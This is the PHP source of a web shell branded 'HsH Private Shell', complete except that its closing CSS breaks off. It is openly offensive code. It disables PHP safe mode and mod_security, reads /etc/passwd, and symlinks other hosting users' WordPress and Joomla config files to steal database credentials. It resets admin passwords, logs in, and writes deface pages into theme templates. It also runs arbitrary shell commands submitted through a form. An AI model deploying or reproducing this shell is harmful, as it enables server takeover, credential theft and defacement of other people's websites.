<?php
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
$enable_wp = true;
$enable_joomla = true;
$enable_vb = false;
$enable_phpbb = false;
$enable_ipb = false;
if(isset($_SESSION['safechk'])){
if(ini_get('safe_mode') or ini_get('disable_functions') or !ini_get('allow_url_fopen')){
$byphp = "safe_mode = Off
disable_functions =
safe_mode_gid = OFF
open_basedir = OFF
allow_url_fopen = On";
$byht = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckUnicodeEncoding Off
</IfModule>";
file_put_contents("php.ini",$byphp);
file_put_contents(".htaccess",$byht);
$_SESSION['safechk'] = "done";
die("PHP Safe Mode ByPassed. Please Refresh This page");
}
}
function convertByte($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function curPageURL() {
$pageURL = 'http';
if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";}
$pageURL .= "://";
if ($_SERVER["SERVER_PORT"] != "80") {
$pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
}else {
$pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
}
return $pageURL;
}
function chkDis($link,$str){
$lol = get_headers($link,1);
if(strpos($lol[0],"200")){
$nan = file_get_contents($link);
if(strpos($nan,$str)){
return true;
}else{return false;}
}else{return false;}
}
function getDnamed(){
if(is_readable("/var/named")){
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$i += 1;
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dn[$owner['name']] = $domain;
}
}
}
return $dn;
}
function chkSys($link){
$sys_arr = array("WordPress"=>array("l"=>"wp-config.php","s"=>"WordPress"),
"Joomla"=>array("l"=>"configuration.php","s"=>"JConfig"),
);
foreach($sys_arr as $k=>$dan){
if(chkDis($link.$dan['l'],$dan['s'])){
return array('link'=>$link.$dan['l'],'cms'=>$k);
}
}
}
function EloFind($str,$start,$end){
$len = strlen($str);
$start_pos = (strpos($str,$start) +strlen($start));
$str = substr($str,$start_pos);
$end_pos = strpos($str,$end);
$str = substr($str,0,$end_pos);
return $str;
}
function GetPage($url,$cookie,$post = null,$head = true) {
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_HEADER,$head);
curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,true);
curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,2);
curl_setopt($ch,CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch,CURLOPT_COOKIEFILE,$cookie);
curl_setopt($ch,CURLOPT_COOKIEJAR,$cookie);
If ($post != NULL){
curl_setopt($ch,CURLOPT_POST,1);
curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
}
$urlPage = curl_exec($ch);
if(curl_errno($ch)){
echo curl_error($ch);
}
curl_close($ch);
return($urlPage);
}
function throwErr($str){
$arr = array("status"=>"error","msg"=>$str);
die(json_encode($arr));
}
function add2file($file,$str){
if(file_exists($file)){
$do = file_get_contents($file);
if(!strpos($do,$str)){
file_put_contents($file,$str,FILE_APPEND);
}
}else{
file_put_contents($file,$str,FILE_APPEND);
}
}
function doXploitWP($cnf,$html,$npass){
$success = false;
$str = file_get_contents($cnf);
if(preg_match('%DB_USER%',$str)){
$username=EloFind($str,"define('DB_USER', '","');");
$password=EloFind($str,"define('DB_PASSWORD', '","');");
$dbname=EloFind($str,"define('DB_NAME', '","');");
$prefix=EloFind($str,"table_prefix  = '","'");
$link=mysql_connect("localhost",$username,$password) ;
if ($link) {
mysql_select_db($dbname,$link) ;
$req1 =mysql_query("UPDATE `".$prefix."users` SET `user_login` = 'admin',`user_pass` = '$1$42REgxSR$.tLV4PSbQmCKsisyCSyhq.' WHERE `ID` =1 LIMIT 1 ;");
$req =mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
$data = mysql_fetch_array($req);
$site_url=$data["option_value"];
}else{
throwErr("Mysql Fail");
}
$status['site'] = $site_url;
$cookie = 'cookie/'.md5($cnf).'.txt';
@unlink($cookie);
$logged_in = true;
$url = $site_url."/wp-login.php";
$postme = 'log=admin&pwd=123456789&rememberme=forever&wp-submit=Log In&testcookie=1';
$logme = GetPage($url,$cookie,$postme);
if(!preg_match('%logout%',$logme)){
file_put_contents("login.txt",$site_url.$logme);
throwErr("Login Error");
}
if($logged_in){
$url = $site_url."/wp-admin/theme-editor.php";
$themeditor = GetPage($url,$cookie,null);
$nola = explode(Chr(10),$themeditor);
foreach($nola as $nline){
if(preg_match('%theme-editor\.php\?file=%',$nline) &&preg_match('%\((index\.php|home\.php|404\.php|archive\.php|comment\.php)\)%',strtolower($nline))){
$modify[EloFind($nline,'(',')')] = EloFind($nline,'<a href="','"');
}
}
if(is_array($modify)){
foreach($modify as $met=>$indfile){
$nri = str_replace('.','_',$met);
$nri = "n".$nri;
if($_POST[$nri] == "on"&&(!$success OR $met == "index.php")){
$indfile =str_replace("&amp;","&",$indfile);
$url = trim($site_url."/wp-admin/".$indfile);
$themepage = GetPage($url,$cookie,"");
$_wpnonce = EloFind($themepage,'name="_wpnonce" value="','"');
$_file = EloFind($themepage,'name="file" value="','"');
$nfile = explode('themes',$_file);
$jfile = $site_url."/wp-content/themes".end($nfile);
$url = $site_url."/wp-admin/theme-editor.php";
$postme = "newcontent=".urlencode($html)."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File";
$themedied = GetPage($url,$cookie,$postme);
if(preg_match('%<div id=\"message\" class=\"updated\">%',$themedied)){
if(!$success){
add2file("wp_site.txt",$jfile.Chr(10));
}
$success = true;
if($met == "index.php"){
add2file("wp_index.txt",$site_url.Chr(10));
}
}else{
$error = true;
}
}
}
}else{
throwErr("No file found");
}
if($success){
$url = trim($site_url."/wp-admin/profile.php");
$themepage = GetPage($url,$cookie,"");
$_wpnonce = EloFind($themepage,'name="_wpnonce" value="','"');
$url = trim($site_url."/wp-admin/profile.php");
$postme = "_wpnonce=".$_wpnonce."&_wp_http_referer=%2Fwp-admin%2Fprofile.php%3Fupdated%3Dtrue&from=profile&checkuser_id=1&admin_color=fresh&admin_bar_front=1&first_name=&last_name=&nickname=admin&display_name=HackerSakitHati&email=contact.suports@gmail.com&url=&aim=&yim=&jabber=&description=&pass1=".$npass."&pass2=".$npass."&action=update&user_id=1&submit=Update+Profile";
$themepage = GetPage($url,$cookie,$postme);
$status['status'] = "success";
die(json_encode($status));
}
else{
if($error){
throwErr("Could't Update the file");
}else{
throwErr("Selected file not found");
}
}
}
}else{
throwErr("Config not found");
}
return true;
}
function doXploitJM($cnf,$html,$npass){
function joomlaCom($site_url,$cookie,$site){
if($_POST['com_install'] == "on"){
$url = $site_url ."/index.php?option=com_installer";
$compage = GetPage($url,$cookie);
preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$compage,$dhash);
$hash = $dhash[1];
preg_match_all('#value="/(.*?)"#s',$compage,$path);
foreach($path[0] as $pathx){
$pathx=ereg_replace('value="','',$pathx);
$pathx=ereg_replace('"','',$pathx);
}
$dir = getcwd()."/HsH.html";
$postme = array("install_package"=>"@".$dir ,"install_directory"=>"".$pathx."","install_url"=>"http://","type"=>"","installtype"=>"upload","task"=>"doInstall","option"=>"com_installer","".$hash.""=>"1");
$url = $site_url ."/index.php?option=com_installer";
$com_shell = GetPage($url,$cookie,$postme);
if(preg_match('#<li>Unknown Archive Type</li>#s',$com_shell)){
add2file("jm_site.txt",$site."/tmp/HsH.html".Chr(10));
$status['site'] = $site."/tmp/HsH.html";
$status['status'] = "success";
die(json_encode($status));
}else{
return false;
}
}
return true;
}
$str = file_get_contents($cnf);
if(preg_match('%(JConfig|mosConfig)%',$str)){
if(preg_match('%JConfig%',$str)){
$username=EloFind($str,"\$user = '","'");
$password=EloFind($str,"\$password = '","'");
$dbname=EloFind($str,"\$db = '","'");
$prefix=EloFind($str,"\$dbprefix = '","'");
$pwd = md5($npass);
if($_POST['domain'] != "..."){
$site_url = $_POST['domain'];
$site_url = "http://".$site_url;
}else{
$mailto = EloFind($str,"\$mailfrom = '","'");
$siteul = explode('@',$mailto);
$site_url = "http://".$siteul[1];
}
}elseif(preg_match('%mosConfig%',$str)){
$username=EloFind($str,"\$mosConfig_user = '","'");
$password=EloFind($str,"\$mosConfig_password = '","'");
$dbname=EloFind($str,"\$mosConfig_db = '","'");
$prefix=EloFind($str,"\$mosConfig_dbprefix = '","'");
$pwd = md5($npass);
if($_POST['domain'] != "..."){
$site_url = $_POST['domain'];
$site_url = "http://".$site_url;
}else{
$mailto = EloFind($str,"\$mosConfig_mailfrom = '","'");
$siteul = explode('@',$mailto);
$site_url = "http://".$siteul[1];
}
}
$site = $site_url;
$site_url = $site_url."/administrator/";
$cookie = 'cookie/'.md5($cnf).'.txt';
@unlink($cookie);
$link=mysql_connect("localhost",$username,$password) ;
if ($link) {
mysql_select_db($dbname,$link);
$changepass = mysql_query("UPDATE ".$prefix."users SET username ='admin' , block ='0' , password = '".$pwd."'");
$doit =mysql_query("SELECT * from  `".$prefix."extensions` ");
if($doit){
if($_POST['ignore_def'] == "on"){
$req =mysql_query("SELECT * from  `".$prefix."template_styles` WHERE client_id='0' and home='0'");
$data = mysql_fetch_array($req);
$template_name=$data["template"];
if(strlen($template_name) <1){
$req =mysql_query("SELECT * from  `".$prefix."template_styles` WHERE client_id='0' and home='1'");
$data = mysql_fetch_array($req);
$template_name=$data["template"];
}
}
else{
$req =mysql_query("SELECT * from  `".$prefix."template_styles` WHERE client_id='0' and home='1'");
$data = mysql_fetch_array($req);
$template_name=$data["template"];
}
$req =mysql_query("SELECT * from  `".$prefix."extensions` WHERE name='".$template_name."'");
$data = mysql_fetch_array($req);
$template_id=$data["extension_id"];
$url = $site_url ."index.php";
$login_page = GetPage($url,$cookie);
$rhash = EloFind($login_page,'type="hidden" name="return" value="','"');
preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$login_page,$dhash);
$hash = $dhash[1];
$url = $site_url ."index.php";
$postme = "username=admin&passwd=".$npass."&usrname=admin&pass=".$npass."&submit=Login&option=com_login&lang=en-GB&task=login&return=".$rhash."&".$hash."=1";
$logginin = GetPage($url,$cookie,$postme);
if(preg_match('%logout|index2\.php%',$logginin)){
$logged_in = true;
}
if(!$logged_in){
file_put_contents("jm_login1.6".md5($site_url).".txt",$site_url.$logginin);
throwErr("Login Error");
}
if($logged_in){
joomlaCom($site_url,$cookie,$site);
$url=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
$themepage = GetPage($url,$cookie);
if(preg_match('%type=\"hidden\" name=\"\w+\" value=\"1\"%',$themepage)){
preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$themepage,$dhash);
$hash = $dhash[1];
$url = $site_url."/index.php?option=com_templates&layout=edit";
$postme = "jform[source]=".urlencode($html)."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hash."=1&task=source.save";
$themeedit = GetPage($url,$cookie,$postme);
if(preg_match('%class=\"message message\"%',$themeedit)){
add2file("jm_site.txt",$site."/templates/".$template_name."/index.php".Chr(10));
add2file("jm_index.txt",$site.Chr(10));
if($_POST['ignore_def'] == "on"){
$status['site'] = $site."/templates/".$template_name."/index.php";
}else{
$status['site'] = $site;
}
$status['status'] = "success";
die(json_encode($status));
}
else{
throwErr("Update failed");
}
}
else{
throwErr("Index not found");
}
}
}else{
$req =mysql_query("SELECT * from  `".$prefix."templates_menu` WHERE client_id='0'");
$data = mysql_fetch_array($req);
$template_name=$data["template"];
$url = $site_url ."index.php";
$login_page = GetPage($url,$cookie);
preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$login_page,$dhash);
$hash = $dhash[1];
$postme = "username=admin&passwd=".$npass."&usrname=admin&lang=en-GB&pass=".$npass."&submit=Login&option=com_login&task=login&".$hash."=1";
$url = $site_url ."index.php";
$logginin = GetPage($url,$cookie,$postme);
if(preg_match('%logout|index2\.php%',$logginin)){
$logged_in = true;
}
if(!$logged_in){
file_put_contents("jm_login1.5".md5($site_url).".txt",$site_url.$logginin);
throwErr("Login Error");
}
if($logged_in){
joomlaCom($site_url,$cookie,$site);
if(preg_match('%index2\.php%',$logginin)){
$url = $site_url ."index2.php";
$logginin = GetPage($url,$cookie);
preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$logginin,$dhash);
$hash = $dhash[1];
$url = $site_url ."/index2.php";
$postme = "doPreview=on&cid%5B%5D=".$template_name."&limit=30&limitstart=0&option=com_templates&task=edit_source&boxchecked=1&hidemainmenu=1&client=0&".$hash."=1";
$themepage = GetPage($url,$cookie,$postme);
if(preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$themepage)){
preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$themepage,$dhash);
$hash = $dhash[1];
$url=$site_url."/index2.php";
$postme = "filecontent=".urlencode($html)."&template=".$template_name."&option=com_templates&task=save_source&client=0&".$hash."=1";
$themeedit = GetPage($url,$cookie,$postme);
if(preg_match('%Template Manager%',$themeedit)){
add2file("jm_site.txt",$site."/templates/".$template_name."/index.php".Chr(10));
add2file("jm_index.txt",$site.Chr(10));
$status['site'] = $site;
$status['status'] = "success";
die(json_encode($status));
}
else{
file_put_contents("jmupd.txt",$site_url.$themeedit);
throwErr($template_name);
}
}else{
throwErr("Index not found");
}
}
else{
preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$logginin,$dhash);
$hash = $dhash[1];
$url = $site_url ."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name."&".$hash."=1";
$themepage = GetPage($url,$cookie);
if(preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$themepage)){
preg_match('%type=\"hidden\" name=\"(\w+)\" value=\"1\"%',$themepage,$dhash);
$hash = $dhash[1];
$url=$site_url."/index.php?option=com_templates&layout=edit";
$postme = "filecontent=".urlencode($html)."&id=".$template_name."&cid[]=".$template_name."&".$hash."=1&task=save_source&client=0";
$themeedit = GetPage($url,$cookie,$postme);
if(preg_match('%class=\"message message fade\"%',$themeedit)){
add2file("jm_site.txt",$site."/templates/".$template_name."/index.php".Chr(10));
add2file("jm_index.txt",$site.Chr(10));
$status['site'] = $site;
$status['status'] = "success";
die(json_encode($status));
}
else{
file_put_contents("jmupd.txt",$site_url.$themeedit);
throwErr($template_name);
}
}else{
throwErr("Index not found");
}
}
}
}
}
else{
throwErr("Mysql Fail");
}
}
else{
throwErr("Config not found");
}
}
function doXploitVB($cnf,$html){
$str = file_get_contents($cnf);
if(preg_match('%vBulletin%',$str)){
$username=EloFind($str,"\$config['MasterServer']['username'] = '","'");
$password=EloFind($str,"\$config['MasterServer']['password'] = '","'");
$dbname=EloFind($str,"\$config['Database']['dbname'] = '","'");
$prefix=EloFind($str,"\$config['Database']['tableprefix'] = '","'");
$link=mysql_connect("localhost",$username,$password) ;
if ($link) {
mysql_select_db($dbname,$link);
$html = str_replace('"','\\\"',$html);
$query = "UPDATE template SET template = '".$html."'";
$result =@ mysql_query($query);
if($result){
$query = "SELECT * FROM `datastore` WHERE title = 'options'";
$result =@ mysql_query($query);
$data = mysql_fetch_array($result);
$optionz=$data["data"];
$site_url = EloFind($optionz,'"bburl";s:34:"','"');
$status['site'] = $site_url;
$status['status'] = "success";
die(json_encode($status));
}else{
throwErr("Update Failed");
}
}else{
throwErr("Mysql Fail");
}
}else{
throwErr("Config not found");
}
}
function exme($in) {
$out = '';
if (function_exists('exec')) {
@exec($in,$out);
$out = @join("</br>",$out);
}elseif (function_exists('passthru')) {
ob_start();
@passthru($in);
$out = ob_get_clean();
}elseif (function_exists('system')) {
ob_start();
@system($in);
$out = ob_get_clean();
}elseif (function_exists('shell_exec')) {
$out = shell_exec($in);
}elseif (is_resource($f = @popen($in,"r"))) {
$out = "";
while(!@feof($f))
$out .= fread($f,1024);
pclose($f);
}
return $out;
}
if($_POST['ac'] == "secinfo"){
if(is_readable("/etc/named.conf")){
echo '&raquo; /etc/named.conf is readable.<br />';
}else{
echo '&raquo; <font color="red">/etc/named.conf not readable</font> <br />';
}
if(is_readable("/etc/passwd")){
echo '&raquo; /etc/passwd is readable.<br />';
}else{
echo '&raquo; <font color="red">/etc/passwd not readable</font> <br />';
}
if(is_readable("/etc/valiases")){
echo '&raquo; /etc/valiases exists';
if(is_array(scandir("/etc/valiases"))){
echo ' & scanable';
}
echo '.<br />';
}else{
echo '&raquo; <font color="red">/etc/valiases not readable</font> <br />';
}
if(is_readable("/var/named")){
echo '&raquo; /var/named exists';
if(is_array(scandir("/var/named"))){
echo ' & scanable';
}
echo '.<br />';
}else{
echo '&raquo; <font color="red">/var/named not readable</font> <br />';
}
if(ini_get('disable_functions')){
echo '&raquo; '.ini_get('disable_functions').' are disabled<br />';
}
if(function_exists("symlink")){
echo '&raquo; Symlinking allowed<br />';
}else{
echo '&raquo; <font color="red">Symlinking not allowed</font> <br />';
}
if(is_writable("/var/tmp")){
echo '&raquo; /var/tmp folder is writable<br />';
}
if(is_readable('/var/log')){
echo '&raquo; /var/log folder is readable<br />';
}
die();
}
elseif($_POST['ac'] == "sysinfo"){
echo "<span style='color:red;'><strong>System:</strong></span> ".php_uname()."<br />";
echo "<span style='color:red;'><strong>WebServer:</strong></span> ".$_SERVER['SERVER_SOFTWARE']."<br />";
echo "<span style='color:red;'><strong>PHP version:</strong></span> ".phpversion()." on ".php_sapi_name()."<br />";
$ssys = "None";
if(is_dir("/usr/local/cpanel")){
$ssys = "Running On Cpanel";
}elseif(is_dir("/usr/local/directadmin")){
$ssys = "Running On Directadmin";
}
echo "<span style='color:red;'><strong>Server System:</strong></span> ".$ssys."<br />";
if(function_exists("disk_total_space")){
echo "<span style='color:red;'><strong>Free Disk:</strong></span> ".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))."<br />";
}
echo "<span style='color:red;'><strong>Server IP:</strong></span> ".$_SERVER["SERVER_ADDR"]."<br />";
die();
}
elseif($_POST['ac'] == "browse"){
error_reporting(0);
if($_POST['path'] != ""){
$path = $_POST['path'];
}else{
$path = getcwd();
}
$filez = scandir($path);
$q = 2;
foreach($filez as $mfile){
if($q == 2){$q = 1;}else{$q = 2;}
$npath = $_POST['path'].$mfile;
$stat = stat($npath);
$usr = posix_getpwuid($stat['uid']);
$grp = posix_getpwuid($stat['gid']);
if(is_dir($npath)){
$size = "Dir";
}else{
$size = convertByte($stat['size']);
}
$fperm = substr(sprintf('%o',fileperms($npath)),-4);
if(!$fperm){
$fperm = "<font color='red'>Restricted</font>";
}elseif(is_writeable($npath)){
$fperm = "<font color='lime'>".$fperm."</font>";
}elseif(is_readable($npath)){
$fperm = "<font color='lime'>".$fperm."</font>";
}
echo '<div class="filetable">
<div class="tblbx'.$q.'" style="width:220px;text-align:left;"><a href="" onClick="filebrs(\''.$npath.'/\'); return false;">'.$mfile.'</a></div>
<div class="tblbx'.$q.'" style="width:80px;">'.$size.'</div>
<div class="tblbx'.$q.'" style="width:100px;">Modify</div>
<div class="tblbx'.$q.'" style="width:100px;">'.$usr['name']."/".$grp['name'].'</div>
<div class="tblbx'.$q.'" style="width:100px;">'.$fperm.'</div>
<div class="tblbx'.$q.'" style="width:80px;">Action</div>
</div>';
}
die();
}
elseif($_POST['ac'] == "chknamed"){
error_reporting(0);
if(is_readable("/etc/named.conf")){
$named = file_get_contents("/etc/named.conf");
preg_match_all('%zone \"(.*)\" {%',$named,$domains);
foreach($domains[1] as $domain){
$domain = trim($domain);
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dn .= "<a href='http://".$domain."'>".$domain."</a> - ".$owner['name']."<br />";
}
echo "Total Domains Found: ".$i."<br />".$dn;
die();
}
elseif(is_readable("/etc/valiases")){
$list = scandir("/etc/valiases");
foreach($list as $domain){
$i += 1;
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dn .= "<a href='http://".$domain."'>".$domain."</a> - ".$owner['name']."<br />";
}
echo "Total Domains Found: ".$i."<br />".$dn;
die();
}
elseif(is_readable("/var/named")){
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$i += 1;
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dn .= "<a href='http://".$domain."'>".$domain."</a> - ".$owner['name']."<br />";
}
}
echo "Total Domains Found: ".$i."<br />".$dn;
die();
}
else{
die("'/etc/named.conf' is not readable. Try scan for public_html. ^_^");
}
}
elseif($_POST['ac'] == "safebypass"){
$byphp = "safe_mode = Off
disable_functions =
safe_mode_gid = OFF
open_basedir = OFF
allow_url_fopen = On";
$byht = "<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckUnicodeEncoding Off
</IfModule>";
file_put_contents("php.ini",$byphp);
file_put_contents(".htaccess",$byht);
echo "<script>alert('Safe Mode ByPassed'); hideAll();</script>";
die();
}
elseif($_POST['ac'] == "chkph"){
if(is_readable("/etc/passwd")){
if(!is_dir("HsH")){
@mkdir('HsH',0777);
}
$htaccss = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
file_put_contents("HsH/.htaccess",$htaccss);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);
foreach($etcz as $etz){
$etcc = explode(":",$etz);
error_reporting(0);
if($enable_wp){
symlink('/home/'.$etcc[0].'/public_html/wp-config.php',"HsH/".$etcc[0].'-WordPress.txt');
symlink('/home/'.$etcc[0].'/public_html/blog/wp-config.php',"HsH/".$etcc[0].'-WordPress.txt');
symlink('/home/'.$etcc[0].'/public_html/wp/wp-config.php',"HsH/".$etcc[0].'-WordPress.txt');
}
if($enable_phpbb){
symlink('/home/'.$etcc[0].'/public_html/config.php',"HsH/".$etcc[0].'-PhpBB.txt');
}
if($enable_vb){
symlink('/home/'.$etcc[0].'/public_html/includes/config.php',"HsH/".$etcc[0].'-vBulletin.txt');
}
if($enable_joomla){
symlink('/home/'.$etcc[0].'/public_html/configuration.php',"HsH/".$etcc[0].'-Joomla.txt');
symlink('/home/'.$etcc[0].'/public_html/web/configuration.php',"HsH/".$etcc[0].'-Joomla.txt');
symlink('/home/'.$etcc[0].'/public_html/site/configuration.php',"HsH/".$etcc[0].'-Joomla.txt');
}
}
$lol = explode("/",curPageURL());
$link = str_replace(end($lol),"",curPageURL());
$str = file_get_contents($link."/HsH");
preg_match_all('%\w \w{4}=(\"|\')(.*)\.txt(\"|\')%',$str,$exp);
if(is_array($exp[2])){
$q = 2;
$dmn = getDnamed();
foreach($exp[2] as $sitez){
if($q == 2){$q = 1;}else{$q = 2;}
$j += 1;
$sn = explode("-",$sitez);
$domain = $dmn[$sn[0]];
if($domain){
$domain = "<a id='inj_dom".$j."' href='http://".$domain."'>".$domain."</a>";
}else{
$domain = "<a id='inj_dom".$j."' href=''>...</a>";
}
$nan .= '<div id="inj'.$j.'">
<div class="tblbx'.$q.'" style="width:200px;cursor:pointer;background-color:lime;" id="injc'.$j.'"onClick="doToggle(\''.$j.'\');">'.$sn[0].'<input style="display:none;" type="checkbox" id="injchk'.$j.'" checked></div>
<div class="tblbx'.$q.'" style="width:220px;" id="inj_domain'.$j.'">'.$domain.'</div>
<div class="tblbx'.$q.'" style="width:160px;"><a id="injst'.$j.'" class="conf" href="'.$link.'HsH/'.$sitez.'.txt" title="'.$j.'">'.ucfirst($sn[1]).'</a></div>
<div class="tblbx'.$q.'" style="width:120px;" id="inj_status'.$j.'" title="On Idle...">Idle...</div>
</div>';
}
$cnt = '<input type="text" style="display:none" id="sitecount" value="'.$j.'">';
echo $nan.$cnt;
}
}
die();
}
elseif($_POST['ac'] == "chkph2"){
if(is_readable("/etc/passwd")){
if(!is_dir("HsH")){
@mkdir('HsH',0777);
}
if(!is_link("HsH/root")){
$sym = symlink("/","HsH/root");
if(!$sym){
die("Symlink method failed.");
}
}
$htaccss = "Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
file_put_contents("HsH/.htaccess",$htaccss);
$etc = file_get_contents("/etc/passwd");
$etcz = explode("\n",$etc);
$lol = explode("/",curPageURL());
$link = str_replace(end($lol),"",curPageURL());
@unlink("rootinject.tmp");
$q = 2;
$dmn = getDnamed();
foreach($etcz as $etz){
$etcc = explode(":",$etz);
$dr = "HsH/root/home/".$etcc[0]."/public_html/";
$dan = chkSys($link.$dr);
if($dan){
if($q == 2){$q = 1;}else{$q = 2;}
$domain = $dmn[$etcc[0]];
if($domain){
$domain = "<a id='inj_dom".$k."' href='http://".$domain."'>".$domain."</a>";
}else{
$domain = "<a id='inj_dom".$k."' href=''>...</a>";
}
$k += 1;
$nant = '<div id="inj'.$k.'">
<div class="tblbx'.$q.'" style="width:200px;cursor:pointer;background-color:lime;" id="injc'.$k.'"onClick="doToggle(\''.$k.'\');">'.$etcc[0].'<input style="display:none;" type="checkbox" id="injchk'.$k.'" checked></div>
<div class="tblbx'.$q.'" style="width:220px;" id="inj_domain'.$k.'">'.$domain.'</div>
<div class="tblbx'.$q.'" style="width:160px;"><a class="conf" href="'.$dan['link'].'">'.$dan['cms'].'</a></div>
<div class="tblbx'.$q.'" style="width:120px;" id="inj_status'.$k.'">Idle...</div>
</div>';
file_put_contents("rootinject.tmp",$nant,FILE_APPEND);
$nan .= $nant;
}
}
$cnt = '<input type="text" style="display:none" id="sitecount" value="'.$k.'">';
echo $nan.$cnt;
}
die();
}
elseif($_POST['ac'] == "inject"){
error_reporting(0);
$cms = strtolower($_POST['cms']);
$cnf = $_POST['conf'];
if(file_exists(md5($_POST['deface_page']))){
$html = file_get_contents(md5($_POST['deface_page']));
}else{
$html = file_get_contents($_POST['deface_page']);
file_put_contents(md5($_POST['deface_page']),$html);
file_put_contents("HsH.html",$html);
}
if(!is_dir("cookie")){
@mkdir("cookie",0777);
}
switch($cms){
case "wordpress":
doXploitWP($cnf,$html,"uradhura123");
break;
case "joomla":
doXploitJM($cnf,$html,"uradhura123");
break;
case "vbulletin":
doXploitVB($cnf,$html);
break;
case "phpbb":
break;
case "ipb":
break;
case "mybb":
break;
case "oscommerce":
break;
case "smf":
break;
case "drupal":
break;
case "seditio":
break;
case "e107":
break;
}
throwErr("Not Added");
}
elseif($_POST['ac'] == "ssh"){
$ssh = exme($_POST['command']);
die(nl2br($ssh));
}
elseif($_POST['ac'] == "phpinfo"){
$php = phpinfo();
die($php);
}
;echo '<html>
<link rel="icon" type="image/gif" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
<title>HsH Private Shell © 2013 </title>
<head>
<script src="http://code.jquery.com/jquery-latest.min.js"></script>
</head>
<body bgcolor="black" background="http://www.madtomatoe.com/wp-content/uploads/2010/11/matrix-animated-image.gif">
<style>
body{
font-family: "courier new";
background-color: black;
font-size:80%;
color: #28FE14;
background-image: url("http://3.bp.blogspot.com/-D6nQQ3d_wfw/Ts31QI5aQPI/AAAAAAAAAgA/mMEBDufqDpk/s1600/0_1_1.gif");
}
#sysinfo{
border: 1px solid #28FE14;
position:fixed;
padding:2px;
top:1px;
left:1px;
background-color: black;
font-size:12px;
}
#phpinfo{
border: 1px solid #28FE14;
position:fixed;
padding:2px;
top:1px;
right:1px;
background-color: black;
font-size:12px;
}
#status{
border: 1px solid #28FE14;
position:fixed;
padding:2px;
bottom:1px;
right:1px;
background-color: black;
font-size:12px;
}
#infobox{
z-index:1;
border: 1px solid #8a00ff;
margin-left:auto;
margin-right:auto;
margin-top:50px;
width:600px;
background-color: black;
font-size:12px;
}
.infotitle{
padding:4px;
background-color: #8a00ff;
color: black;
font-family: Thaoma;
font-size:14px;
}
.infotxt{
padding:5px;
}

.sidebar{
position:fixed;
left:1px;
top:30%;
}
.stitle{
float:left;
cursor:pointer;
padding:7px;
color:black;
background-color: #8a00ff;
}
.stitle:hover{
color:red;
}
.smnu{
display:none;
background-color: black;
padding:5px;
border: 1px solid #8a00ff;
float:left;
}
a{
color: #df5;
text-decoration: none;
}
a:hover{
color:#8a00ff;
}
.copyright{
position:fixed;
bottom:1px;
left:1px;
padding:2px;
}
.logo{
margin:auto;
width:600px;
height:600px;
background-image: url("");
}
.filetable{
margin-top:2px;
width:740px;
}
.tblcnt{
text-align: center;
margin-left:2px;
color:black;
background-color: #8a00ff;
padding:3px;
float:left;
border: 1px solid #8a00ff;
}
.tblbx1{
height:12px;
text-align: center;
margin-left:2px;
color:#8a00ff;
background-color: #333333;
padding:3px;
float:left;
border: 1px solid #333333;
}
.tblbx2{
height:12px;
text-align: center;
margin-left:2px;
color:#8a00ff;
background-color: #444444;
padding:3px;
float:left;
border: 1px solid #444444;
}

.tbl{
margin-top:100px;
padding-top:2px;
padding-bottom: 2px;
margin:auto;
width:742px;
border: 1px solid #8a00ff;
}
.rbox{
float:left;
